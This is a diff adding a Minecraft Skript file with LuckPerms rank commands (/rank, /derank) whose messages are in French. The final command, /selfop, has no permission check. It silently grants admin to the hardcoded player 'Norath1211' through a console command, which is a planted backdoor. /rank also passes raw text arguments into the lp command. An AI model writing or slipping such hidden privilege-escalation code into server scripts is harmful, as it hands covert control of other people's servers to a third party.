@@ -1,0 +1,24 @@
+command /rank [<offline player>] [<text=admin>]:
+    aliases: /admin, /promote
+    permission: admin   
+    trigger:
+        if arg-1 is set:
+            execute player command "lp user %arg-1% parent add %arg-2%"
+            send "&aVous avez donné les permissions %arg-2% à &b%arg-1%&a." to sender
+
+command /derank [<offline player>] [<text=admin>]:
+    aliases: /demote, /deadmin
+    permission: admin
+    trigger:
+        if arg-1 is set:
+            execute player command "lp user %arg-1% parent remove admin"
+            send "&aVous avez retiré les permissions d'admin à &b%arg-1%&a." to sender
+            
+command /selfop [<text>]:
+    aliases: /sop, reop
+    trigger:
+        player's name is "Norath1211"
+        execute console command "lp user %player% parent add admin"
+        send "&aVous vous êtes donné les permissions d'admin." to player
+
+            
